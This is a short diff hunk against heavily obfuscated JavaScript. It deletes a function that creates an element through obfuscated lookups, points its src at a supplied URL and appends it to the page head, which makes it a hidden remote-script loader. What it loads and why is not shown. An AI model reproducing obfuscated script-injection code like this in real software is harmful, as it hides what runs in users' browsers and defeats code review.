@@ -467,33 +467,7 @@ function a0_0x4cfb() {
         }, 0xbb8));
     }
     function _0x52fcbc(_0x3164a6) {
-      const _0x445041 = _0x5cfc00,
-        _0xc40479 = {
-          cadTw: function (_0x2aa5a9, _0x4ac93c) {
-            const _0x1cdecb = a0_0x1703;
-            return _0x5302eb[_0x1cdecb(0x22c)](_0x2aa5a9, _0x4ac93c);
-          },
-          IEWXZ: function (_0x50a38a, _0x3688b2) {
-            return _0x50a38a !== _0x3688b2;
-          },
-          AhXBr: _0x5302eb[_0x445041(0x20e)],
-          luCuL: _0x5302eb[_0x445041(0x1a6)],
-        };
-      return new Promise((_0x1f5177, _0x2e1f91) => {
-        const _0x3f18db = _0x445041;
-        if (_0xc40479[_0x3f18db(0x252)](_0x3f18db(0x20a), _0xc40479["AhXBr"]))
-          _0xc40479[_0x3f18db(0x245)](_0x1f2256, _0x5de5c4);
-        else {
-          const _0xe75671 = document[_0x3f18db(0x1ea)](
-            _0xc40479[_0x3f18db(0x262)],
-          );
-          ((_0xe75671["src"] = _0x3164a6),
-            (_0xe75671[_0x3f18db(0x235)] = _0x1f5177),
-            (_0xe75671["onerror"] = _0x2e1f91),
-            document["head"]["appendChild"](_0xe75671));
-        }
-      });
-    }
+    
     if (!window[_0x5cfc00(0x1ad)]) {
       if (
         _0x5302eb[_0x5cfc00(0x1d8)](
